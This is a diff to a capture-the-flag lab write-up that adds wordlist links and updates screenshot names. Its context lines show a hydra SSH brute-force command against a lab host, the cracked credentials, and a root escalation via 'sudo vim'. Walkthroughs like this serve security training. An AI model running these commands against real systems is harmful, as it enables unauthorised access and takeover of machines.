@@ -62,6 +62,8 @@ so use hydra to bruteforce username and password
 ```bash
 hydra -l usernames.txt -P best110.txt ssh://10.10.140.110:2222 -t 4
 ```
+[Username wordlist](./usernames.txt),
+[Password wordlist](./best110.txt)
 ```
 [DATA] attacking ssh://10.10.140.110:2222/
 [2222][ssh] host: 10.10.140.110   login: mitch   password: secret
@@ -104,7 +106,9 @@ To escalate privilage we need to exploit vim
 ```
 sudo vim
 ```
-![image](./ScreenShots/sudo.png)
+![image](./ScreenShots/shell1.png)
+![image](./ScreenShots/root1.png)
+
 ### What's the root flag?
-![image](./ScreenShots/root.png)
+![image](./ScreenShots/final.png)
 > W3ll d0n3. You made it!
